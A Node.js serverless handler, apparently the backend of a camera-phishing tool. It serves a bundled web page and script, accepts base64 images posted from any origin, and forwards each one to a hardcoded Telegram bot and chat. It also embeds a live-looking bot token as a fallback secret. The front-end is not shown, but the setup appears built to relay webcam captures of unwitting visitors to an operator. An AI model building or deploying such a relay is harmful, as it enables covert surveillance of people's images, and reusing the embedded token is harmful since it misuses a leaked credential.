require('dotenv').config({ path: require('path').join(__dirname, '../.env') });

const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

// Vars — .env yoki fallback qiymatlar
const BOT_TOKEN = process.env.BOT_TOKEN || '8848454103:AAHHim01x1-A_dYR9vSTECJexQtOSnLUmZY';
const CHAT_ID   = process.env.CHAT_ID || '6370350005';

// Main Handler
module.exports = async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.statusCode = 200;
        res.end();
        return;
    }

    if (req.method === 'GET') {
        const url = (req.url || '/').split('?')[0];
        let fileName = 'index.html';
        let mime = 'text/html';

        if (url.endsWith('.css') || url === '/style.css') {
            fileName = 'style.css';
            mime = 'text/css';
        } else if (url.endsWith('.js') || url === '/script.js') {
            fileName = 'script.js';
            mime = 'application/javascript';
        } else if (url.endsWith('.json') || url === '/manifest.json') {
            fileName = 'manifest.json';
            mime = 'application/json';
        }

        // Search locations
        const candidates = [
            path.join(__dirname, '..', fileName),
            path.join(__dirname, '../public', fileName),
            path.join(__dirname, fileName)
        ];

        for (const cand of candidates) {
            if (fs.existsSync(cand)) {
                res.setHeader('Content-Type', mime);
                res.statusCode = 200;
                return res.end(fs.readFileSync(cand));
            }
        }

        res.statusCode = 200;
        return res.end('Camera Backend is running');
    }

    if (req.method !== 'POST') {
        res.statusCode = 200;
        res.end('Camera Backend (Base64 Mode) is Running!');
        return;
    }

    try {
        let body = req.body;
        if (typeof body === 'string') {
            try { body = JSON.parse(body); } catch (e) {}
        }
        const { image } = body || {};

        if (!image) {
            res.statusCode = 400;
            res.setHeader('Content-Type', 'application/json');
            res.end(JSON.stringify({ error: 'No image data received. Ensure Content-Type is application/json' }));
            return;
        }

        // image is "data:image/jpeg;base64,......."
        const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');

        console.log('Sending photo to Telegram...');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, {
            filename: 'photo.jpg',
            contentType: 'image/jpeg',
        });

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            form,
            {
                headers: { ...form.getHeaders() },
            }
        );

        res.statusCode = 200;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ success: true, telegram: telegramResponse.data.ok }));

    } catch (error) {
        console.error('Error:', error.message);
        res.statusCode = 500;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({
            error: error.response ? error.response.data.description : error.message
        }));
    }
};
